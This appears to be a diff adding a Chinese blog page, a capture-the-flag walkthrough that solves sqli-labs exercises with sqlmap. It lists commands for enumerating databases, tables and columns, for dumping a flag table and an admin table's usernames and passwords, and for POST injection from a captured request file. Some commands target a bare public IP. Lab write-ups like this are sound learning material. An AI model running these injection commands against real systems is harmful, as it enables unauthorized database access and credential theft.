@@ -1,0 +1,40 @@
+<h1 id="sqlmap通关sqli-labs"><a href="#sqlmap通关sqli-labs" class="headerlink" title="sqlmap通关sqli-labs"></a>sqlmap通关sqli-labs</h1><h2 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h2><blockquote>
+<p>&#x3D;&#x3D;获取用户：&#x3D;&#x3D;​<code>root@localhost</code>​</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --current-user</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取当前数据库：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 --current-db</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取数据库：&#x3D;&#x3D;​<code>ctftraining</code>​</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 --dbs</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code></p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining --tables</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取所有字段&#x3D;&#x3D;获取admin表里的字段<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin --columns</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取字段值&#x3D;&#x3D;<br>​<code>sqlmap -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C Id,password,username --dump</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -u http://ac5ceb14-e90d-472a-be02-3ad160f2b6ee.node5.buuoj.cn/Less-2/?id=1 -D ctftraining -T flag --dump</code>​</p>
+</blockquote>
+<p>‍</p>
+<h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><blockquote>
+<p>使用BP抓包&#x3D;&#x3D;获取post报文&#x3D;&#x3D;，保存在&#x3D;&#x3D;txt文件&#x3D;&#x3D;里、&#x3D;&#x3D;-r代表文档&#x3D;&#x3D;，文档内容就是你的&#x3D;&#x3D;post报文&#x3D;&#x3D; –batch 自动选择yes、<br>获取到我们熟知的关键数据库：ctftraining</p>
+<p>​<code>sqlmap -r post_sqlmap.txt --batch -dbs</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取表：&#x3D;&#x3D;​<code>flag、news、users</code>​</p>
+<p>​<code>sqlmap -r 1.txt --batch -D ctftraining --tables</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;获取flag：&#x3D;&#x3D;</p>
+<p>​<code>sqlmap -r 1.txt --batch -D ctftraining -T flag --dump</code>​</p>
+</blockquote>
+<p>‍</p>
